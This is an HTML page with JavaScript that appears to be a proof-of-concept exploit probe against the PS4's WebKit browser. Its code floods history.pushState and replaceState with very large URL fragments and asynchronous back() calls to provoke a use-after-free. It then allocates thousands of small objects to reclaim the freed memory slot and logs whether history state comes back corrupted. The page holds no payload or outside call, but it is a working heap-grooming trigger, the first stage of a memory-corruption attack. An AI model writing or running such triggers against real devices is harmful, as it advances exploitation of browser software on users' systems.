<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – History Slot Fixation Probe</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { padding:12px; font-size:16px; margin:10px 0; }
#log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; }
</style>
</head>
<body>

<h2>History Entry Slot Fixation – Final Probe</h2>
<button onclick="run()">RUN SLOT FIXATION TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function triggerUAF(){
    let size = 977;
    const STEP = 14461;

    log("=== UAF TRIGGER START ===");

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({i}, "", "#"+frag);
        history.replaceState({i}, "", "#"+frag.slice(0, frag.length>>1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

function occupySmallSlot(){
    // Candidatos clássicos a ocupar ~32B
    let o1 = {a:1};
    let o2 = {b:2};
    let o3 = Object.create(null);
    let o4 = {x:0,y:0,z:0};
    return [o1,o2,o3,o4];
}

async function run(){
    logEl.textContent = "";
    await triggerUAF();

    log("\n=== BASELINE ===");
    log("URL.length = " + document.URL.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    log("\n=== SLOT REUSE PHASE ===");
    let slots = [];
    for(let i=0;i<5000;i++){
        slots.push(occupySmallSlot());
    }
    log("Allocated small objects: " + slots.length);

    log("\n=== CONTROL COLLISION ===");
    history.replaceState({ctrl:"A"}, "", "#X");
    history.replaceState({ctrl:"B"}, "", "#"+"B".repeat(680644));
    history.back();

    await sleep(50);

    log("\n=== POST ===");
    log("URL.length = " + document.URL.length);
    log("hash.length = " + location.hash.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    log("\n=== CONSISTENCY CHECK ===");
    log("Final ctrl = " + history.state?.ctrl);
    log("=== TEST END ===");
}

log("Ready.");
</script>
</body>
</html>
